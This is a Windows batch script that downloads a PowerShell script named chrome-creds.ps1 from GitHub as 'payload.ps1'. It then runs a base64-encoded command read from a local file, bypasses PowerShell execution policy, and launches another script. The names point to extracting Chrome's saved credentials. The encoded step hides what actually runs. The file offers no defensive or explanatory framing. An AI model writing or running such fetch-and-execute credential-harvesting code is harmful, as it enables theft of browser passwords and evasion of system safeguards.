@echo off
set "WORK_DIR=%TEMP%\chrome_creds_tmp"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload.ps1"
cd /d "%WORK_DIR%"
for /f "delims=" %%i in ('type "C:\Users\Alex\Documents\DEV\GITHUB\SCRIPT-WINDOWS-ALEEXLEDEV\b64.txt"') do set B64CMD=%%i
powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand %B64CMD%
echo "Generation done"
powershell -NoProfile -ExecutionPolicy Bypass -File "run_chrome.ps1"
echo "Execution done"
